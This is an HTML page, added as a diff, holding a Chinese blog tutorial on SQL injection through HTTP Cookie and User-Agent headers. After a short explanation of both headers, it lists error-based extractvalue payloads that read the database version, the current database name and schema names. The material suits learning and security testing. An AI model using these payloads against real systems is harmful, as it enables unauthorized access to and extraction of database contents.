@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>SQL注入之cookie和user-agent注入 | Wisejay | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="SQL注入">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>SQL注入之cookie和user-agent注入</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">SQL注入之cookie和user-agent注入</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-08-17T13:49:16.000Z" itemprop="datePublished" class="page-time">
+  2019-08-17
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-SQL注入之cookie和user-agent注入"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">SQL注入之cookie和user-agent注入</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-08-17 21:49:16" datetime="2019-08-17T13:49:16.000Z"  itemprop="datePublished">2019-08-17</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="cookie简介"><a href="#cookie简介" class="headerlink" title="cookie简介"></a>cookie简介</h2><p>cookie是一串加密过的数据，是网站为了辨别用户身份而存在在用户本地终端。简单理解。它就是一个用户身份凭证，并保存在本地客户端。</p>
+<p>它的请求原理大概为这个：用户使用浏览器第一次访问网站服务器时，服务器会返回给用户浏览器一段数据，浏览器将其保存到本地，以后用户使用浏览器每次再访问网站服务器时，请求都带着这个cookie数据来标明自己用户的身份。</p>
+<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>cookie注入，简单理解为http协议包中对cookie值进行sql注入。与之前get，post也是相似的，只是注入点位置不一样罢了。</p>
+<h2 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h2><blockquote>
+<p>Cookie: uname=admin’</p>
+</blockquote>
+<h2 id="查询数据库版本信息"><a href="#查询数据库版本信息" class="headerlink" title="查询数据库版本信息"></a>查询数据库版本信息</h2><blockquote>
+<p>Cookie: uname=admin’ and (extractvalue(1,concat(0x7e,(select @@version),0x7e)))#</p>
+</blockquote>
+<p>这里套用extractvalue()函数报错</p>
+<h2 id="查询当前数据库名称"><a href="#查询当前数据库名称" class="headerlink" title="查询当前数据库名称"></a>查询当前数据库名称</h2><blockquote>
+<p>Cookie: uname=admin’ and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#</p>
+</blockquote>
+<p>接下来关于查询表名，字段名和数据，就是中间select子查询部分更换下sql注入语句就好了</p>
+<h1 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h1><h2 id="user-agent简介"><a href="#user-agent简介" class="headerlink" title="user-agent简介"></a>user-agent简介</h2><p>user-agen也是http协议请求携带的参数信息。它名为用户代理。主要是用于告知服务器知道客户端一些终端信息。user-gent往往包含着以下客户端内容：使用的浏览器及版本号、操作系统版本等等。</p>
+<h2 id="查询数据库版本"><a href="#查询数据库版本" class="headerlink" title="查询数据库版本"></a>查询数据库版本</h2><blockquote>
+<p>User-Agent:’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
+</blockquote>
+<h2 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h2><blockquote>
+<p>User-Agent:’and extractvalue(1,concat(0x7e,(select database()),0x7e)) or ‘1’=’1</p>
+</blockquote>
+<h2 id="查询第三个数据库名"><a href="#查询第三个数据库名" class="headerlink" title="查询第三个数据库名"></a>查询第三个数据库名</h2><blockquote>
+<p>User-Agent:’and extractvalue(1,concat(0x7e,(select schemaname from informationschema.schemata limit 3,1),0x7e)) or ‘1’=’1</p>
+</blockquote>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-08-16T14:40:46.100Z" itemprop="dateUpdated">2019-08-16 22:40:46</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/08/17/SQL注入之cookie和user-agent注入/" target="_blank" rel="external">http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.top">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/&title=《SQL注入之cookie和user-agent注入》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/&title=《SQL注入之cookie和user-agent注入》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/08/19/SQL注入之盲注/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">SQL注入之盲注</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/08/16/SQL注入之POST注入/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">SQL注入之POST注入</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#cookie"><span class="post-toc-number">1.</span> <span class="post-toc-text">cookie</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#cookie简介"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">cookie简介</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#cookie注入"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">cookie注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注入点测试"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">注入点测试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询数据库版本信息"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">查询数据库版本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询当前数据库名称"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">查询当前数据库名称</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-agent"><span class="post-toc-number">2.</span> <span class="post-toc-text">user-agent</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#user-agent简介"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">user-agent简介</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询数据库版本"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">查询数据库版本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询当前数据库"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">查询当前数据库</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询第三个数据库名"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">查询第三个数据库名</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019 - 2020
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/&title=《SQL注入之cookie和user-agent注入》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/&title=《SQL注入之cookie和user-agent注入》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACyklEQVR42u3awZLaQAwEUP7/p0lVTkkos92SJ3B4PlFeYub5MKO09HjE1/P39Xrnz/uvd94/Ifnr8+V6nLjw8PDwRku/uvKlJ4u4eubr/eTz+zXj4eHhneYlS8k3+uSltMfP+/Vc3sfDw8P7KO898v0GvTlykteNh4eH9/28pLxOyt9ZsY6Hh4f3DbwkjMgPjHYReehwMGvBw8PD63bgIib4hs8H+3t4eHh4i656flTk2/2wLB6tFg8PD+8EbxPF5u38WVybPCF6ZXh4eHi38lpMu+knYcGmgP7hO3h4eHgHeCfGAvKDJCmX8/GvKKXGw8PDu4nX7qj7AjofC9i8IDw8PLwTvLzYzX9sXzS367n8V3h4eHgHeMmjN9v3Joxoh7fw8PDw/g8vr7Lb5lNbju9bX3UDDA8PD2/ByyOJWcSwOULySPeHmQg8PDy8Y7w8IMjHrfZjB8PmGR4eHt4BXt6Mn7XzZ2FHflwVk2V4eHh4N/HqlPem2YQ85L3tSMDDw8O7lbcZe2qX2P7i5oDBw8PDO81rN/d2u8/bV5uW2F+f8fDw8I7xNsMBm3HSJASZhSZ1WoyHh4e36A21G3c7StWOnyaweugKDw8Pb8Eb/ic/Js3GBTahcFH14+Hh4S14+ZRBEuDmm3u73DxoxsPDwzvHm7W12g09PzxmQcblM/Hw8PAO8PLjoW1WtadT3h7Dw8PD+yxvv6DZAFY7aJXDoqErPDw8vAWvbdvPRqnaJlk77FUkLnh4eHhr3rO89gMHbSsreQVRSY2Hh4d3E6/ddvPvzMazNozNoYKHh4fX8tpyeRO5tkV2W45HP4CHh4d3E28Ws7anTc7YHF2X8xF4eHh4X8PbfCcfPhhGHnh4eHgf5eXZRlJkJ6V8OxB2GUbg4eHhHeDNwohNi2v2nLaFhoeHh3eCt2mAbWLc5LBJSvOD/T08PDy8f+/8AuoM+T4TExbHAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
+</html>
